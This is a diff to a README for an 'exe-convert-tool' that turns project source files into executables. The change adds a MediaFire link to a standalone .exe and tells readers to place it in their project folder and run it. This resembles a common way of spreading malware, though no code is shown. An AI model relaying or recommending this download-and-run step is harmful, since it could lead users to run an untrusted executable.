@@ -25,15 +25,13 @@ If you want to use your work to increase your social media reputation, don't for
 -   [Node.js](https://nodejs.org/en/) v18.0.0 or higher
 
 ## How to use
-1.  Download the tool from [here]()
-2.  Extract the `exe-convert-tool.zip` file
-3.  Open the `exe-convert-tool` folder
-4.  Copy `exe-convert-tool.exe` to your project folder
-5.  Open the `exe-convert-tool.exe` file
-6.  Choose your language
-7.  Enter the file name
-8.  Wait for the tool to convert your file
-9.  Enjoy!
+1.  Download the tool from [here](https://www.mediafire.com/file/zbmbo3k6dhyolqe/exe-convert-tool.exe/)
+2.  Copy `exe-convert-tool.exe` to your project folder
+3.  Open the `exe-convert-tool.exe` file
+4.  Choose your language
+5.  Enter the file name
+6.  Wait for the tool to convert your file
+7.  Enjoy!
 
 ## Support Languages
 -   [x] JavaScript
